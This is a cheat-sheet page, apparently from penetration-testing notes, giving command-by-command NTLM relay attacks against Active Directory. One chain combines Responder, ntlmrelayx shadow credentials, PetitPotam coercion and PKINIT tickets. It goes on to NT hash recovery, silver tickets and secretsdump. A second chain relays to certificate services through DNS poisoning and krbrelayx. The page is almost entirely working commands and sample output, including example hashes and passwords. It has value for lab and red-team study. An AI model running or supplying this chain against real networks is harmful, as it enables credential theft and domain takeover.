---
title: "NTLM Relay Attack"
tags: ["Shadow Credential", "NTLM", "LDAP", "Pass-The-Hash", "Impacket", "NTLM Replay", "Petitpotam", "Active Directory", "Windows", "ADCS", "WebDAV", "Pkinit", "Ticket Granting Ticket"]
---

### Abuse #1: Shadow Credential

#### 1. Redirect Traffic (Pivoting Node) \[Optional\]

```console
# Upload socat.zip and unzip
Expand-Archive -Path "<SOCAT_ZIP_FILE_PATH>" -DestinationPath "<DEST_PATH>" -Force
```

```console {class="sample-code"}
PS C:\xampp\htdocs> Expand-Archive -Path "C:\xampp\htdocs\socat.zip" -DestinationPath "C:\xampp\htdocs\" -Force
```

```console
.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80
```

```console {class="sample-code"}
PS C:\xampp\htdocs\socat-windows-master> .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80
      0 [main] socat 2084 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer.  Please report this problem to
the public mailing list cygwin@cygwin.com
```

<small>*Ref: [socat](https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master)*</small>

#### 2. Enable WebClient Service (Windows Target) \[Optional\]

```console
# Local Linux
sudo responder -I tun0
```

```console
# Windows target
net use x: http://<LOCAL_IP>/
```

```console
# Check
./GetWebDAVStatus.exe <TARGET_DOMAIN>
```

```console {class="sample-code"}
./GetWebDAVStatus.exe 10.10.254.230
[+] WebClient service is active on 10.10.254.230
```

<small>*Ref: [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus)*</small>

#### 3. Add a DNS Entry in Trusted Zone

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r <SUBDOMAIN>.<DOMAIN> -d <LOCAL_IP> --action add <DC_IP>
```

```console {class="sample-code"}
$ python dnstool.py -u 'example.com\apple.seed' -p 'P@ssw0rd123' -r test.example.com -d 10.8.7.13 --action add 10.10.143.101    
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Import module
. ./Powermad.ps1
```

```console
# Add new entry
New-ADIDNSNode -Tombstone -Verbose -Node * -Data <LOCAL_IP>
```

{{< /tabcontent >}}

#### 4. Start Responder Listener (Local Linux)

```console
# Modify /etc/responder/Responder.conf
; Servers to start
SMB      = Off
HTTP     = Off
HTTPS    = Off
LDAP     = Off
```

<br>

```console
sudo responder -I tun0 -w -d -v
```

#### 5. Start NTLM Relay Server (Local Linux)

#### Get Latest Impacket

```console
git clone https://github.com/fortra/impacket.git
```

```console
cd impacket
```

```console
python3 -m venv venv
```

```console
source venv/bin/activate
```

```console
pip3 install .
```

```console
pip3 install impacket pyOpenSSL==24.0.0
```

#### Run ntlmrelayx

```console
python3 examples/ntlmrelayx.py -t ldaps://<DC_IP> -smb2support --adcs --shadow-credentials --shadow-target '<TARGET_HOSTNAME>$' 
```

```console {class="sample-code"}
$ python3 examples/ntlmrelayx.py -t ldaps://10.10.254.229 -smb2support --adcs --shadow-credentials --shadow-target 'ws01$'
Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

#### 6. Coerce Authentication

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
python3 PetitPotam.py -u '<USER>@<DOMAIN>' -hashes :<HASH> <RESPONDER_MACHINE_NAME>@80/test <LOCAL_IP> -pipe all
```

```console {class="sample-code"}
python3 PetitPotam.py -u "test.user@example.com" -hashes ":7ddf32e17a6ac5ce04a8ecbf782ca509" ms01@8090/test 192.168.100.101 -pipe all

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe efsr
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]
Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
---[SNIP]---
```

<small>*Ref: [PetitPotam](https://github.com/topotam/PetitPotam)*</small>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

```console
./SpoolSample.exe <TARGET_DOMAIN> <RESPONDER_MACHINE_NAME>@80/test
```

{{< /tabcontent >}}

#### 7. Request TGT Using pfx File (Local Linux)

```console
# Request a TGT
python3 gettgtpkinit.py '<DOMAIN>/<TARGET_HOSTNAME>$' <TARGET_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_PASSWORD> -dc-ip <DC_IP>
```

```console {class="sample-code"}
python3 gettgtpkinit.py example.com/MS01$ MS01.ccache -cert-pfx ../impacket/h6fAqHvi.pfx -pfx-pass LDyywqG39RKUx6kmjeHr -dc-ip 192.168.100.100
2024-04-02 16:17:58,897 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-04-02 16:17:58,907 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-04-02 16:18:07,594 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-04-02 16:18:07,594 minikerberos INFO     7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
INFO:minikerberos:7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
2024-04-02 16:18:07,597 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

```console
# Check
nxc smb <DC> --use-kcache
```

<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>

#### 8. Get NTLM Hash (Local Linux)

```console
# Import ticket
export KRB5CCNAME='<TARGET_HOSTNAME>.ccache'
```

```console
python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
```

```console {class="sample-code"}
$ python3 getnthash.py example.com/'ms01$' -key 7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
59920e994636168744039017dcf49e54
```

#### 9. Get Silver Ticket

```console
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn anything/<TARGET_DOMAIN> administrator
```

#### 10. Secrets Dump

```console
# Import ticket
export KRB5CCNAME='administrator.ccache'
```

```console
# Secrets dump
impacket-secretsdump -k -no-pass <TARGET_DOMAIN>
```

---

### Abuse #2: Abusing Active Directory Certificate Services

#### 1. Run socat to Redirect Traffic (Inside Pivoting Node) \[Optional\]

```console
./socat tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 &
```

#### 2. DNS Poisoning

```console
python3 examples/ntlmrelayx.py -t "ldap://<DC_IP>" --no-smb-server --no-dump --no-da --no-acl --no-validate-privs --add-dns-record '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

#### 3. Add hostnames to /etc/hosts

```console
<DC_IP> <DC_HOSTNAME>.<DOMAIN>
<TARGET_IP> <TARGET_HOSTNAME>.<DOMAIN>
```

#### 4. Relay NTLM to ADCS

```console
python3 krbrelayx.py -t 'https://<DC_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp' --adcs -v '<TARGET_HOSTNAME>$'
```

#### 5. Run PetitPotam

```console
proxychains4 -q python3 PetitPotam.py -u '<UESR>' -p '<PASSWORD>' -d <DOMAIN> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
```

#### 6. Request a TGT Using pfx file

```console
python3 gettgtpkinit.py -cert-pfx '<TARGET_HOSTNAME>$.pfx' '<DOMAIN>/<TARGET_HOSTNAME>$' '<TARGET_HOSTNAME>$.ccache'
```

#### 7. Get NT Hash

```console
python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
```